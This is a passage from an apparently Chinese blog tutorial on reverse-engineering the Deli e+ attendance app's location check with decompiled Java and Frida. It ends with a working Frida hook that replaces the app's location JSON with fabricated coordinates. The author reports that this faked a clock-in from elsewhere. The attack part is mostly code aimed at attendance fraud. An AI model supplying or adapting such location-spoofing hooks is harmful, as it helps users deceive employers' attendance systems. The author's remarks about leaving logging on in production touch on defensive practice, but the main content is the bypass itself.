class=\"line\"><span class=\"keyword\">public</span> BaseSDKResult <span class=\"title function_\">a</span><span class=\"params\">(LocationGetRequest locationGetRequest, com.delicloud.app.jsbridge.main.c cVar)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//第一个判断①gd，通过传入context获取了系统服务LocationManager，</span></span><br><span class=\"line\">    <span class=\"comment\">//然后isProviderEnabled(GeocodeSearch.GPS)翻译：GPS服务能用吗，</span></span><br><span class=\"line\">    <span class=\"comment\">//locationManager.isProviderEnabled(&quot;network&quot;)网络定位能用吗，</span></span><br><span class=\"line\">    <span class=\"comment\">//如果其中一个可以用，那么就进入里面代码块，如果都不能，就进入②toast一个提示语。</span></span><br><span class=\"line\">    <span class=\"comment\">//显然，这个APP在进入首页的时候会问你要定位权限，你一定要给，有了定位</span></span><br><span class=\"line\">    <span class=\"comment\">//这里的判断就一定会成立。</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (com.delicloud.app.tools.utils.i.gd(<span class=\"built_in\">this</span>.mContentActivity)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//③n方法代码判断</span></span><br><span class=\"line\">        <span class=\"comment\">//这里就是再次检查权限，如果没有弹窗提示要权限，</span></span><br><span class=\"line\">        <span class=\"comment\">//如果没有权限，就没有下文了，我们会给APP权限的，这里判断就可以默认为true了</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (com.delicloud.app.tools.utils.m.n(<span class=\"built_in\">this</span>)) &#123;</span><br><span class=\"line\">          \t<span class=\"comment\">//④be方法，从本地sp文件中根据某个key取出数据，然后强转为AddressModel对象。</span></span><br><span class=\"line\">            <span class=\"type\">AddressModel</span> <span class=\"variable\">addressModel</span> <span class=\"operator\">=</span> (AddressModel) dl.a.be(<span class=\"built_in\">this</span>.mContentActivity, com.delicloud.app.commom.b.bBz);</span><br><span class=\"line\">            <span class=\"comment\">//请求的时候如果需要缓存，且缓存的addressModel不是空的</span></span><br><span class=\"line\">          \t<span class=\"comment\">//且当前时间和缓存的时间小于10000ms（10秒），就使用缓存。</span></span><br><span class=\"line\">            <span class=\"comment\">//经过我的动态调试，addressModel是null，也就是这里的判断不成立。</span></span><br><span class=\"line\">          \t<span class=\"comment\">//⑤，看我给出的动态调试代码。</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (locationGetRequest.isCache() &amp;&amp; addressModel != <span class=\"literal\">null</span> &amp;&amp; System.currentTimeMillis() - addressModel.getCache_time() &lt;= <span class=\"number\">10000</span>) &#123;</span><br><span class=\"line\">                <span class=\"type\">LocationGetResult</span> <span class=\"variable\">locationGetResult</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">LocationGetResult</span>();</span><br><span class=\"line\">                locationGetResult.setData(<span class=\"keyword\">new</span> <span class=\"title class_\">LocationGetResult</span>.LocationGetData(addressModel.getLatitude(), addressModel.getLongitude(), addressModel.getName(), addressModel.getAddress()));</span><br><span class=\"line\">                Log.e(<span class=\"string\">&quot;cache&quot;</span>, com.delicloud.app.http.utils.c.aq(locationGetResult));</span><br><span class=\"line\">                dl.a.a(<span class=\"built_in\">this</span>.mContentActivity, com.delicloud.app.commom.b.bBz, <span class=\"literal\">null</span>);</span><br><span class=\"line\">              \t<span class=\"comment\">//这里如果存在缓存，就直接返回数据，不需要再去申请定位</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> locationGetResult;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//取缓存不成功，就是申请获取位置了。</span></span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">boolean</span>[] zArr = &#123;<span class=\"literal\">true</span>&#125;;</span><br><span class=\"line\">            <span class=\"comment\">//看到这里，做开发的小伙伴就秒懂了。</span></span><br><span class=\"line\">          \t<span class=\"comment\">//rxJava，创建订阅，子线程走某事，成功后切换主线下拿到结果。</span></span><br><span class=\"line\">            <span class=\"comment\">//也就是⑥位置是结果，我们关注结果就行了。</span></span><br><span class=\"line\">            Observable.create(<span class=\"keyword\">new</span> <span class=\"title class_\">ObservableOnSubscribe</span>&lt;Long&gt;() &#123; <span class=\"comment\">// from class: com.delicloud.app.jsbridge.ui.fragment.SDKWebViewFragment.7</span></span><br><span class=\"line\">                <span class=\"meta\">@Override</span> <span class=\"comment\">// io.reactivex.ObservableOnSubscribe</span></span><br><span class=\"line\">                <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">subscribe</span><span class=\"params\">(ObservableEmitter&lt;Long&gt; observableEmitter)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (SDKWebViewFragment.<span class=\"built_in\">this</span>.bLI == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    SDKWebViewFragment.<span class=\"built_in\">this</span>.bLI.a(<span class=\"keyword\">new</span> <span class=\"title class_\">a</span>.InterfaceC0166a() &#123; <span class=\"comment\">// from class: com.delicloud.app.jsbridge.ui.fragment.SDKWebViewFragment.7.1</span></span><br><span class=\"line\">                        <span class=\"meta\">@Override</span> <span class=\"comment\">// com.delicloud.app.tools.utils.a.InterfaceC0166a</span></span><br><span class=\"line\">                        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">a</span><span class=\"params\">(<span class=\"type\">double</span> d2, <span class=\"type\">double</span> d3, String str, String str2, String str3, String str4)</span> &#123;</span><br><span class=\"line\">                            zArr[<span class=\"number\">0</span>] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                            <span class=\"type\">LocationGetResult</span> <span class=\"variable\">locationGetResult2</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">LocationGetResult</span>();</span><br><span class=\"line\">                            locationGetResult2.setData(<span class=\"keyword\">new</span> <span class=\"title class_\">LocationGetResult</span>.LocationGetData(Double.valueOf(d2), Double.valueOf(d3), str, str2));</span><br><span class=\"line\">                            Log.i(SocializeConstants.KEY_LOCATION, com.delicloud.app.http.utils.c.aq(locationGetResult2));</span><br><span class=\"line\">                            SDKWebViewFragment.<span class=\"built_in\">this</span>.a(com.delicloud.app.jsbridge.b.chq, locationGetResult2);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"meta\">@Override</span> <span class=\"comment\">// com.delicloud.app.tools.utils.a.InterfaceC0166a</span></span><br><span class=\"line\">                        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">ZP</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">                            zArr[<span class=\"number\">0</span>] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                            SDKWebViewFragment.<span class=\"built_in\">this</span>.a(com.delicloud.app.jsbridge.b.chq, <span class=\"keyword\">new</span> <span class=\"title class_\">BaseSDKResult</span>(JsSDKResultCode.GET_LOCATION_RESULT_FAIL));</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;).timeout(<span class=\"number\">60L</span>, TimeUnit.SECONDS).subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread()).subscribe(<span class=\"keyword\">new</span> <span class=\"title class_\">Observer</span>&lt;Long&gt;() &#123; <span class=\"comment\">// from class: com.delicloud.app.jsbridge.ui.fragment.SDKWebViewFragment.6</span></span><br><span class=\"line\">                <span class=\"meta\">@Override</span> <span class=\"comment\">// io.reactivex.Observer</span></span><br><span class=\"line\">                <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onComplete</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"meta\">@Override</span> <span class=\"comment\">// io.reactivex.Observer</span></span><br><span class=\"line\">                <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onSubscribe</span><span class=\"params\">(Disposable disposable)</span> &#123;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"meta\">@Override</span> <span class=\"comment\">// io.reactivex.Observer</span></span><br><span class=\"line\">                <span class=\"comment\">/* renamed from: e */</span></span><br><span class=\"line\">                <span class=\"comment\">//⑥这里是定位返回成功后</span></span><br><span class=\"line\">                <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onNext</span><span class=\"params\">(Long l2)</span> &#123;</span><br><span class=\"line\">                   \t<span class=\"comment\">//看到这个判断我觉得很奇怪，为什么要这样呢，到底是否成立呢。</span></span><br><span class=\"line\">                  \t<span class=\"comment\">//看到申请定位前有那么一句final boolean[] zArr = &#123;true&#125;;</span></span><br><span class=\"line\">                  \t<span class=\"comment\">//这又是何苦，上面标记了true，那判断就一定成立。</span></span><br><span class=\"line\">                    <span class=\"comment\">//最后我们调用了a方法。文章往下拉，看a的实现。⑥</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (zArr[<span class=\"number\">0</span>]) &#123;</span><br><span class=\"line\">                        SDKWebViewFragment.<span class=\"built_in\">this</span>.a(com.delicloud.app.jsbridge.b.chq, <span class=\"keyword\">new</span> <span class=\"title class_\">BaseSDKResult</span>(JsSDKResultCode.GET_LOCATION_RESULT_FAIL));</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"meta\">@Override</span> <span class=\"comment\">// io.reactivex.Observer</span></span><br><span class=\"line\">                <span class=\"comment\">//这里是rxJava流程遇到错误回调</span></span><br><span class=\"line\">                <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onError</span><span class=\"params\">(Throwable th)</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (zArr[<span class=\"number\">0</span>]) &#123;</span><br><span class=\"line\">                        SDKWebViewFragment.<span class=\"built_in\">this</span>.a(com.delicloud.app.jsbridge.b.chq, <span class=\"keyword\">new</span> <span class=\"title class_\">BaseSDKResult</span>(JsSDKResultCode.GET_LOCATION_RESULT_FAIL));</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//如果GPS和定位不能用，就toast</span></span><br><span class=\"line\">    es.dmoral.toasty.b.bQ(<span class=\"built_in\">this</span>.mContentActivity, <span class=\"string\">&quot;当前系统定位开关未开启，无法定位&quot;</span>).show();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BaseSDKResult</span>(JsSDKResultCode.IBEACON_NEED_LOCATION_PERMISSION);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>①：gd这个判断，做了什么呢，进去看看。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">i</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//获取定位服务，判断是否可用，如果我们授权了肯定可以用</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">gd</span><span class=\"params\">(Context context)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">LocationManager</span> <span class=\"variable\">locationManager</span> <span class=\"operator\">=</span> (LocationManager) context.getSystemService(SocializeConstants.KEY_LOCATION);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> locationManager.isProviderEnabled(GeocodeSearch.GPS) || locationManager.isProviderEnabled(<span class=\"string\">&quot;network&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>③再次检查定位权限</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">n</span><span class=\"params\">(<span class=\"keyword\">final</span> Fragment fragment)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c(fragment.getContext(), cxo)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (com.delicloud.app.commom.b.bAc) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    com.delicloud.app.commom.b.bAc = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    com.delicloud.app.deiui.feedback.dialog.b.bVs.d(fragment.getActivity(), <span class=\"string\">&quot;得力e+申请访问精准定位权限&quot;</span>, <span class=\"string\">&quot;用于极速打卡、考勤签到打卡、天气服务等功能。拒绝或取消授权不影响其他服务&quot;</span>, <span class=\"string\">&quot;去开启&quot;</span>, <span class=\"string\">&quot;取消&quot;</span>, <span class=\"literal\">true</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">b</span>.a() &#123; <span class=\"comment\">// from class: com.delicloud.app.tools.utils.m.6</span></span><br><span class=\"line\">        <span class=\"meta\">@Override</span> <span class=\"comment\">// com.delicloud.app.deiui.feedback.dialog.b.a</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">Za</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            es.dmoral.toasty.b.bQ(Fragment.<span class=\"built_in\">this</span>.getActivity(), <span class=\"string\">&quot;权限拒绝后，将无法使用该功能&quot;</span>).show();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span> <span class=\"comment\">// com.delicloud.app.deiui.feedback.dialog.b.a</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">Zb</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            m.a(Fragment.<span class=\"built_in\">this</span>, m.cxo, <span class=\"number\">12</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;).show(fragment.getChildFragmentManager(), <span class=\"string\">&quot;权限申请&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>④根据一个key字符串，获取本地储存的数据，然后转Java bean对象。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">public static &lt;T extends Serializable&gt; T be(Context context, String str) &#123;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">        return (T) bh(context, str);</span><br><span class=\"line\">    &#125; catch (Exception e2) &#123;</span><br><span class=\"line\">        e2.printStackTrace();</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    private static Object bh(Context context, String str) throws IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">    //从sp中取出数据</span><br><span class=\"line\">    String string = getString(context, str);</span><br><span class=\"line\">    if (TextUtils.isEmpty(string)) &#123;</span><br><span class=\"line\">        return null;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //这里经过base64解码，也就是我们可以根据str这个key去sp中找到里面的数据</span><br><span class=\"line\">    //然后base64解码就可以看到存储内容了，有兴趣可以hook得到str，看看sp的数据哦</span><br><span class=\"line\">    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.decode(string.getBytes(), 0));</span><br><span class=\"line\">    ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class=\"line\">    Object readObject = objectInputStream.readObject();</span><br><span class=\"line\">    byteArrayInputStream.close();</span><br><span class=\"line\">    objectInputStream.close();</span><br><span class=\"line\">    return readObject;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>⑤AddressModel addressModel &#x3D; (AddressModel) dl.a.be(this.mContentActivity, com.delicloud.app.commom.b.bBz);中be方法frida hook代码，这里也可以用Xposed的hook，看你自己会那个。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> a = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;dl.a&quot;</span>);</span><br><span class=\"line\">a[<span class=\"string\">&quot;be&quot;</span>].<span class=\"property\">implementation</span> = <span class=\"keyword\">function</span> (<span class=\"params\">context, str</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;be is called&#x27;</span> + <span class=\"string\">&#x27;, &#x27;</span> + <span class=\"string\">&#x27;context: &#x27;</span> + context + <span class=\"string\">&#x27;, &#x27;</span> + <span class=\"string\">&#x27;str: &#x27;</span> + str);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> ret = <span class=\"variable language_\">this</span>.<span class=\"title function_\">be</span>(context, str);</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;be ret value is &#x27;</span> + ret);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>经过我的调试，返回值是null，也就是没缓存，取缓存条件不成立，继续往下走。</p>\n<p>⑥onNext流程调用了a</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">a</span><span class=\"params\">(String str, BaseSDKResult baseSDKResult)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//这里可以忽略，这东西不是null,原因，fragment创建的时候，获取了webview组件</span></span><br><span class=\"line\">  \t<span class=\"comment\">//ckD就是BridgeWebView实例，不可能，</span></span><br><span class=\"line\">  \t<span class=\"comment\">//这里判断是防止fragment退出之后清理了BridgeWebView，rxJava还继续回调引发</span></span><br><span class=\"line\">  \t<span class=\"comment\">//空指针异常，要判断下，正常情况下可以理解往下走</span></span><br><span class=\"line\">  \t<span class=\"comment\">//以下就是ckD赋值代码</span></span><br><span class=\"line\">  \t<span class=\"comment\">//public View onCreateView(LayoutInflater layoutInflater, \\</span></span><br><span class=\"line\">    <span class=\"comment\">//@Nullable ViewGroup viewGroup, @Nullable Bundle bundle) &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//View onCreateView = super.onCreateView(layoutInflater, viewGroup, bundle);</span></span><br><span class=\"line\">    <span class=\"comment\">//this.ckD = (BridgeWebView) onCreateView.findViewById(R.id.fragment_web_view);</span></span><br><span class=\"line\">    <span class=\"comment\">//return onCreateView;</span></span><br><span class=\"line\">    <span class=\"comment\">//&#125;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.ckD == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//这个开发真是个大聪明，居然直接把重要数据log打印出来，我真的谢谢你。</span></span><br><span class=\"line\">  \t<span class=\"comment\">//在开发的时候调试版本可以打log，辅助开发，到了生产环境一定要把log关掉</span></span><br><span class=\"line\">  \t<span class=\"comment\">//通常我们都是使用一个log工具做代理，统一打印log处理</span></span><br><span class=\"line\">  \t<span class=\"comment\">//在发布最终版本的时候关闭log工具开关，同时通过混淆把Log.i等代码移除</span></span><br><span class=\"line\">  \t<span class=\"comment\">//大家可以过滤看看，这里打印了什么，破解的方案就在这里了</span></span><br><span class=\"line\">    Log.i(<span class=\"string\">&quot;SDKWebViewFragment&quot;</span>, <span class=\"string\">&quot;call back registerMethod=&quot;</span> + str + <span class=\"string\">&quot;,result=&quot;</span> + com.delicloud.app.http.utils.c.aq(baseSDKResult));</span><br><span class=\"line\">  \t<span class=\"comment\">//ckF是private HashMap&lt;String, c&gt; ckF = new HashMap&lt;&gt;();一个Map</span></span><br><span class=\"line\">  \t<span class=\"comment\">//这里的判断是：Map中是否包含了str这个（变量里面的值）键值对，如果有，就取出str对应的</span></span><br><span class=\"line\">  \t<span class=\"comment\">//value，这个value就是c对象，c对象是：</span></span><br><span class=\"line\">  \t<span class=\"comment\">//public interface c &#123;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//    void nm(String str);</span></span><br><span class=\"line\">    <span class=\"comment\">//&#125;</span></span><br><span class=\"line\">  \t<span class=\"comment\">//用人话说就是：取出str对应的c接口的具体实现对象然后调用nm方法</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.ckF.containsKey(str)) &#123;</span><br><span class=\"line\">      \t<span class=\"comment\">//这里调用nm之前，aq方法处理了baseSDKResult（里面就是定位结果）⑦</span></span><br><span class=\"line\">        <span class=\"built_in\">this</span>.ckF.get(str).nm(com.delicloud.app.http.utils.c.aq(baseSDKResult));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>⑦进去aq看看，里面做了什么呢。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">aq</span><span class=\"params\">(Object obj2)</span> &#123;</span><br><span class=\"line\">    gson = afV();</span><br><span class=\"line\">    <span class=\"type\">Gson</span> <span class=\"variable\">gson2</span> <span class=\"operator\">=</span> gson;</span><br><span class=\"line\">  \t<span class=\"comment\">//gson是一个处理json的工具，这里使用了gson的api，把java bean转成json字符串</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (gson2 != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">      \t<span class=\"comment\">//把传递进来的java bean转json字符串</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> gson2.toJson(obj2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>做开发的人基本上秒懂了，就是java bean转json吗，那么我们可以看看aq方法到底返回了什么。</p>\n<p>上frida hook就行。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">let</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> Java.use(<span class=\"string\">&quot;com.delicloud.app.http.utils.c&quot;</span>);</span><br><span class=\"line\">c[<span class=\"string\">&quot;aq&quot;</span>].implementation = function (obj2) &#123;</span><br><span class=\"line\">    console.log(<span class=\"string\">&#x27;aq is called&#x27;</span> + <span class=\"string\">&#x27;, &#x27;</span> + <span class=\"string\">&#x27;obj2: &#x27;</span> + obj2);</span><br><span class=\"line\">    <span class=\"type\">let</span> <span class=\"variable\">ret</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.aq(obj2);</span><br><span class=\"line\">    console.log(<span class=\"string\">&#x27;aq ret value is &#x27;</span> + ret);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;code&quot;</span>:<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;data&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;address&quot;</span>:<span class=\"string\">&quot;广东省广州市&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;latitude&quot;</span>:<span class=\"number\">23.</span>xxxx,</span><br><span class=\"line\">        <span class=\"string\">&quot;longitude&quot;</span>:<span class=\"number\">113.</span>xxxx,</span><br><span class=\"line\">        <span class=\"string\">&quot;name&quot;</span>:<span class=\"string\">&quot;xx大厦&quot;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;method&quot;</span>:<span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;msg&quot;</span>:<span class=\"string\">&quot;成功&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>打印的数据居然是这样的。</p>\n<p>聪明的你应该知道怎么做了吧？</p>\n<h4 id=\"frida-hook改位置\"><a href=\"#frida-hook改位置\" class=\"headerlink\" title=\"frida hook改位置\"></a>frida hook改位置</h4><p>经过动态调试之后，我发现了aq的数据居然包含了位置信息，我当时就想到了破解方案。</p>\n<p>替换大法！</p>\n<p>我去替换里面的数据，看看效果如何。</p>\n<p>说干就干。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//com.delicloud.app.http.utils.c</span></span><br><span class=\"line\"><span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> com_delicloud_app_http_utils_c_clz = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&#x27;com.delicloud.app.http.utils.c&#x27;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">var</span> com_delicloud_app_http_utils_c_clz_method_aq_4105 = com_delicloud_app_http_utils_c_clz.<span class=\"property\">aq</span>.<span class=\"title function_\">overload</span>(<span class=\"string\">&#x27;java.lang.Object&#x27;</span>);</span><br><span class=\"line\">    com_delicloud_app_http_utils_c_clz_method_aq_4105.<span class=\"property\">implementation</span> = <span class=\"keyword\">function</span>(<span class=\"params\">v0</span>) &#123;</span><br><span class=\"line\">         </span><br><span class=\"line\">        <span class=\"keyword\">var</span> ret = com_delicloud_app_http_utils_c_clz_method_aq_4105.<span class=\"title function_\">call</span>(com_delicloud_app_http_utils_c_clz, v0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;json：&quot;</span>, ret);</span><br><span class=\"line\">        <span class=\"comment\">//data&quot;:&#123;&quot;address</span></span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;判断地址：：&quot;</span> + ret.<span class=\"title function_\">indexOf</span>(<span class=\"string\">&quot;data\\&quot;:\\&#123;\\&quot;address&quot;</span>) != -<span class=\"number\">1</span> );</span><br><span class=\"line\">      \t<span class=\"comment\">//代码中必须把json转义，不转义语法错误。</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> addr = <span class=\"string\">&quot;&#123;\\n&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot;    \\&quot;code\\&quot;:0,\\n&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot;    \\&quot;data\\&quot;:&#123;\\n&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot;        \\&quot;address\\&quot;:\\&quot;目标地址名称，自己替换经纬度，后面给工具获取\\&quot;,\\n&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot;        \\&quot;latitude\\&quot;:23.2222,\\n&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot;        \\&quot;longitude\\&quot;:113.22222,\\n&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot;        \\&quot;name\\&quot;:\\&quot;某大厦\\&quot;\\n&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot;    &#125;,\\n&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot;    \\&quot;method\\&quot;:\\&quot;\\&quot;,\\n&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot;    \\&quot;msg\\&quot;:\\&quot;成功\\&quot;\\n&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//如果返回的数据包含了这样的字符串，就直接替换我们目的地，其他</span></span><br><span class=\"line\">        <span class=\"comment\">//java bean转json的就正常返回就行。</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret.<span class=\"title function_\">indexOf</span>(<span class=\"string\">&quot;data\\&quot;:\\&#123;\\&quot;address&quot;</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> addr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">     </span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>执行脚本，下拉刷新看看效果。</p>\n<p><img src=\"https://reverse-1307040378.cos.ap-chengdu.myqcloud.com/reverse2022020801/1675822080_3.png\"></p>\n<p>我反手就点了，打卡成功。</p>\n<p>看到这里，像做持久化hook的应该秒懂了。</p>\n<p>我就不提供相关的成品了。</p>\n<h4 id=\"如何获取正确坐标\"><a href=\"#如何获取正确坐标\" class=\"headerlink\" title=\"如何获取正确坐标\"></a>如何获取正确坐标</h4><p>刚开始的时候我是去<a 